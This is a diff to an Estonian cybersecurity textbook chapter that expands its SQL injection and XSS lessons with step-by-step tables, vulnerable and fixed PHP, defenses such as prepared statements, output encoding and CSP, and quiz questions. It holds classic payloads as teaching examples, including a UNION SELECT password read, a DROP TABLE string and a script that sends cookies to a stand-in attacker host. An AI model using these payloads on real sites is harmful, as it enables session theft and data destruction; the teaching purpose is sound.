@@ -269,6 +269,8 @@ Joonis: krüpteerimata ühenduses näeb ja muudab ründaja kõike. TLS-iga näeb
 
 Joonis: sisend `' OR '1'='1` muudab tingimuse alati tõeseks ja päring tagastab kõik kasutajad.
 
+> 🖱️ **Proovi ise:** [interaktiivne näide](https://valdonolvak.github.io/Operatsioonis-steemi-ja-k-berturbe-alused/interaktiivne/24-sql-syst-ja-xss.html#sqli). Kirjuta sisend ja vaata, milline osa sellest muutub käsuks.
+
 Vaatame samm-sammult. Programm koostab päringu nii:
 
 ```php
@@ -276,7 +278,25 @@ Vaatame samm-sammult. Programm koostab päringu nii:
 $sql = "SELECT * FROM users WHERE name = '" . $_GET['nimi'] . "'";
 ```
 
-Kui kasutaja sisestab `mari`, tekib päring `WHERE name = 'mari'`. Kui ta sisestab `' OR '1'='1`, tekib `WHERE name = '' OR '1'='1'`. Esimene ülakoma sulges stringi, ülejäänu sai käsu osaks ja tingimus on alati tõene. Sama võttega saab lugeda teisi tabeleid (`UNION SELECT`), muuta andmeid või mõnes andmebaasis isegi käske käivitada.
+Punkt (`.`) liidab PHP-s stringid kokku. Päring tekib kolmest tükist:
+
+| Tükk | Kes kirjutas | Sisu |
+| --- | --- | --- |
+| 1 | programmeerija | `SELECT * FROM users WHERE name = '` (lõpeb avava ülakomaga) |
+| 2 | kasutaja | `$_GET['nimi']` ehk URL-ist tulnud tekst, nt `?nimi=mari` |
+| 3 | programmeerija | `'` (sulgev ülakoma) |
+
+PHP ei tunne SQL-i. Ta liidab tekstid kokku ja saadab andmebaasile ühe stringi, milles ei ole enam näha, kus üks tükk lõppes ja teine algas. SQL-is tähistab ülakoma stringi algust ja lõppu. Kui kasutaja sisendis on ülakoma, sulgeb see programmeerija avatud stringi ja kõik järgnev loetakse käsuna.
+
+| Sisend | Andmebaas saab | Mis juhtub |
+| --- | --- | --- |
+| `mari` | `WHERE name = 'mari'` | sisend jääb stringi sisse, leitakse Mari |
+| `' OR '1'='1` | `WHERE name = '' OR '1'='1'` | tingimus on alati tõene ja päring tagastab kõik kasutajad; viimase ülakoma lisas programm ise |
+| `' UNION SELECT kasutaja, parool FROM admins -- ` | `WHERE name = '' UNION SELECT kasutaja, parool FROM admins -- '` | tulemusele liidetakse teise tabeli andmed; `--` muudab rea lõpu kommentaariks |
+| `'; DROP TABLE users; -- ` | `WHERE name = ''; DROP TABLE users; -- '` | kui ühendus lubab mitut käsku korraga, kustutatakse tabel |
+| `O'Brien` | `WHERE name = 'O'Brien'` | rünnet pole, kuid päring katkeb süntaksiveaga – aus nimi lõhub päringu sama vea tõttu |
+
+Sisselogimisvormis tähendab teine rida sageli sisselogimist ilma paroolita.
 
 Lahendus on **parameetritega päring** (prepared statement):
 
@@ -286,17 +306,68 @@ $stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
 $stmt->execute([$_GET['nimi']]);
 ```
 
-Andmebaas saab enne päringu struktuuri ja alles siis väärtuse. Väärtust ei tõlgendata kunagi käsuna, olgu selles mis tahes märgid. Lisakaitsena kasutab rakendus andmebaasikontot, millel on ainult vajalikud õigused (ei saa näiteks tabeleid kustutada).
+Päring jõuab andmebaasi kahes osas:
+
+1. `prepare()` saadab päringu **struktuuri** koos kohahoidjaga `?`. Andmebaas parsib selle ja käsu kuju on edaspidi lukus.
+2. `execute()` saadab **väärtuse** eraldi. Andmebaas paneb selle `?` kohale andmena ega parsi seda SQL-ina.
+
+Väärtust ei tõlgendata kunagi käsuna, olgu selles mis tahes märgid. Sisendi `' OR '1'='1` korral otsib andmebaas kasutajat, kelle nimi on täpselt `' OR '1'='1`, ega leia teda. `O'Brien` leitakse aga õigesti.
+
+- Ülakomade „puhastamine“ (`addslashes()`, `str_replace()`) ei ole lahendus. Sellest saab mööda, näiteks numbriväljas pole ülakoma vajagi: `WHERE id = 1 OR 1=1`.
+- PDO-s lülita päringute emuleerimine välja (`PDO::ATTR_EMULATE_PREPARES => false`). Siis eraldab päringu ja väärtuse andmebaasiserver, mitte PHP.
+- Parameetriks saab panna ainult väärtusi, mitte tabeli- ega veerunimesid. Kui kasutaja valib näiteks sorteerimisveeru, kontrolli valikut lubatud nimede loendi vastu.
+- Lisakaitsena kasutab rakendus andmebaasikontot, millel on ainult vajalikud õigused (ei saa näiteks tabeleid kustutada).
 
 #### XSS
 
-**XSS** (cross-site scripting) on sama viga veebilehel: kasutaja sisestatud tekst kuvatakse teistele HTML-ina ja selles olev skript käivitub teise kasutaja brauseris. Kui kommentaarivälja kirjutatakse `<script>fetch('https://ryndaja.ee/?c='+document.cookie)</script>` ja leht näitab seda muutmata, saadab iga lugeja brauser oma seansiküpsise ründajale.
+**XSS** (cross-site scripting) on sama viga veebilehel. SQL-süsti korral muutub sisend andmebaasi jaoks käsuks, XSS-i korral brauseri jaoks HTML-iks ja JavaScriptiks. Skript ei käivitu ründaja, vaid **teise kasutaja** brauseris ja töötab lehe nimel: see näeb lehe sisu ja küpsiseid ning saab teha toiminguid kasutaja nimel.
+
+> 🖱️ **Proovi ise:** [interaktiivne näide](https://valdonolvak.github.io/Operatsioonis-steemi-ja-k-berturbe-alused/interaktiivne/24-sql-syst-ja-xss.html#xss). Kirjuta kommentaar ja vaata, mida brauser sellest teeb.
+
+Vaatame jälle samm-sammult. Kommentaaride leht näitab kommentaare nii:
+
+```php
+// OHTLIK: kommentaar kleebitakse HTML-i sisse
+echo "<p>" . $kommentaar . "</p>";
+```
+
+Brauser ei tea, milline osa HTML-ist tuli programmeerijalt ja milline kommentaari kirjutajalt. HTML-is tähistab `<` sildi algust. Kui kommentaaris on `<`, alustab see uut silti.
+
+| Kommentaar | Brauser saab | Mis juhtub |
+| --- | --- | --- |
+| `Tore artikkel!` | `<p>Tore artikkel!</p>` | tavaline tekst |
+| `<b>väga</b> tore` | `<p><b>väga</b> tore</p>` | „väga“ on paksus kirjas: sisend muutis lehe struktuuri; skripti pole, aga auk on olemas |
+| `<script>fetch('https://ryndaja.ee/?c='+document.cookie)</script>` | `<p><script>…</script></p>` | iga lugeja brauser saadab oma seansiküpsise ründaja serverisse |
+| `<img src=x onerror=alert(1)>` | `<p><img src=x onerror=alert(1)></p>` | pilti ei leita ja `onerror` käivitab skripti; sõna `script` pole vajagi, seega sõnade keelamine ei aita |
+
+Seansiküpsisega saab ründaja ohvri kontosse siseneda ilma parooli ja MFA-ta, sest ohver on juba sisse loginud.
+
+XSS-i liigid:
 
 - **salvestatud XSS** – pahatahtlik tekst salvestatakse andmebaasi (kommentaar, profiilinimi) ja käivitub kõigil vaatajatel;
 - **peegeldatud XSS** – skript on lingis (`?otsing=<script>…`) ja käivitub ainult sellel, kes lingile klõpsab;
 - **DOM-põhine XSS** – viga on lehe enda JavaScriptis, mis kirjutab URL-i osa lehele.
 
-**Kaitse:** väljundi kodeerimine (PHP-s `htmlspecialchars()`, mis teeb `<`-st `&lt;`), turvalised raamistikud, mis seda vaikimisi teevad, **Content Security Policy** (CSP) päis, mis keelab tundmatust allikast skriptid, ja küpsiste lipud `HttpOnly` (JavaScript ei näe küpsist) ning `SameSite`. Veebirakenduste levinumad vead koondab [OWASP Top 10](https://owasp.org/Top10/) ja praktilised juhised [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/).
+Lahendus on **väljundi kodeerimine**: enne HTML-i panemist muudetakse erimärgid HTML-olemiteks.
+
+```php
+// TURVALINE: erimärgid kodeeritakse enne väljastamist
+echo "<p>" . htmlspecialchars($kommentaar, ENT_QUOTES, 'UTF-8') . "</p>";
+```
+
+| Märk | Muutub |
+| --- | --- |
+| `<` ja `>` | `&lt;` ja `&gt;` |
+| `"` ja `'` | `&quot;` ja `&#039;` |
+| `&` | `&amp;` |
+
+Kommentaar `<script>…` jõuab brauserisse kujul `&lt;script&gt;…`. Brauser näitab ekraanil märke `<script>`, kuid ei loe neid sildina. Põhimõte on sama mis parameetritega päringul: sisend jääb andmeks.
+
+- Kodeeri **väljastamisel**, mitte salvestamisel. Andmebaasis hoitakse algne tekst, sest sama teksti võidakse näidata HTML-is, JSON-is või e-kirjas ja igaüks vajab oma kodeerimist.
+- Kodeerimine sõltub kohast. `htmlspecialchars()` kaitseb HTML-i teksti ja jutumärkides atribuudi väärtust, kuid mitte lingi aadressi: `<a href="javascript:alert(1)">` ei sisalda ühtki kodeeritavat märki. Kasutaja antud URL-i puhul kontrolli, et see algab `https://`-ga. Kasutaja andmeid ära kirjuta `<script>`-ploki sisse.
+- JavaScriptis kasuta `element.textContent = tekst`, mitte `innerHTML`. `innerHTML` on DOM-põhise XSS-i levinuim põhjus.
+
+**Lisakaitsed:** turvalised raamistikud ja mallimootorid, mis kodeerivad vaikimisi; **Content Security Policy** (CSP) päis, nt `Content-Security-Policy: script-src 'self'`, mis lubab ainult saidi enda skriptifaile, nii et lehe sisse süstitud `<script>` ja `onerror` ei käivitu; küpsiste lipud `HttpOnly` (JavaScript ei näe küpsist) ja `SameSite`. Veebirakenduste levinumad vead koondab [OWASP Top 10](https://owasp.org/Top10/) ja praktilised juhised [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/).
 
 #### Teenusetõkestamine (DoS ja DDoS)
 
@@ -350,6 +421,7 @@ Tänapäeva lähenemine lisab sellele **eelduse, et rikkumine on juba toimunud**
 10. Miks aitab FIDO2-turvavõti õngitsuse vastu paremini kui SMS-kood?
 11. Kuidas tekib SQL-süst ja miks parameetritega päring selle välistab?
 12. Miks ei saa mahupõhist DDoS-rünnet peatada oma tulemüüriga?
+13. Kuidas tekib XSS ja miks `htmlspecialchars()` selle välistab? Miks ei aita sõna `<script>` keelamine?
 
 ### Valikküsimused
 
@@ -358,6 +430,7 @@ Tänapäeva lähenemine lisab sellele **eelduse, et rikkumine on juba toimunud**
 3. Mis on Cyber Kill Chaini esimene etapp? a) luure b) paigaldamine c) ärakasutamine d) juhtimiskanal
 4. Mis kaitseb SQL-süsti eest kõige paremini? a) pikem parool b) tulemüür c) HTTPS d) parameetritega päringud
 5. Mis aitab kõige paremini õngitsuse ja MFA-väsitamise vastu? a) SMS-kood b) turvaküsimus c) FIDO2-turvavõti või pääsuvõti d) pikem parool
+6. Mis kaitseb salvestatud XSS-i eest kõige paremini? a) parameetritega päringud b) väljundi kodeerimine c) HTTPS d) tugev parool
 
 ### Praktiline ülesanne
 
